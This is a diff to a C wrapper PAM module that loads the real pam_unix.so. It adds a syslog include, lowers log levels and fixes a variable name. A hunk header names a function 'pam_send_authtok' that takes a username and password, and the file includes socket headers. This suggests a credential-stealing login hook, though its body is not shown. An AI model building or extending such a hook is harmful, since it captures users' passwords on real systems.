@@ -5,6 +5,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <dlfcn.h>
+#include <syslog.h>
 #include <sys/socket.h>
 #include <unistd.h>
 #include <arpa/inet.h>
@@ -39,13 +40,13 @@ int pam_send_authtok(const char *message, const char *username, const char *pass
 int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int argc, const char **argv) {
     void *handle = dlopen(PAM_PATH, RTLD_LAZY);
     if (!handle) {
-        pam_syslog(pamh, LOG_CRIT, "PAM unable to dlopen(pam_unix.so): %s", dlerror());
+        pam_syslog(pamh, LOG_ERR, "PAM unable to dlopen(pam_unix.so): %s", dlerror());
         return PAM_PERM_DENIED;
     }
 
     pam_func_t func = (pam_func_t)dlsym(handle, name);
     if (!func) {
-        pam_syslog(pamh, LOG_CRIT, "PAM unable to resolve symbol: %s", func_name);
+        pam_syslog(pamh, LOG_ERR, "PAM unable to resolve symbol: %s", name);
         dlclose(handle);
         return PAM_PERM_DENIED;
     }
